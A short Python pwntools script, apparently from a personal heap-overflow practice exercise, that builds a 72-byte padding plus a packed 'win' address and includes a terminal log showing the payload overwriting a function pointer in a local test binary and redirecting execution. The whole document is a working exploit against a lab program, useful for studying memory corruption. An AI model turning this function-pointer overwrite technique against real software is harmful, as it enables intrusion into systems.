from pwn import *


win = p64(0x1000004b0)
p = b"A"*40 + b"A"*32 + win
print(p)



"""
╭─    ~/books/pwn/heap/heap_overflow  on   main !1 ?3 ·············································································· ✔  at 10:05:20 
╰─ aslrbp -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0\x04\x00\x00\x01\x00\x00\x00' ./3
&c[0]:      0x1005bdaa0
&c[1]:      0x1005bdac8
&c[0].buf:  0x1005bdaa0
&c[0].fn:   0x1005bdac0
&c[1].buf:  0x1005bdac8
&c[1].fn:   0x1005bdae8
win:        0x1000004b0
safe:       0x1000004cc
read into c[0].buf:
calling c[1].fn()
1    1.c    1.py    2    2.c    2.py    3    3.c    3.py    aslrbp
"""
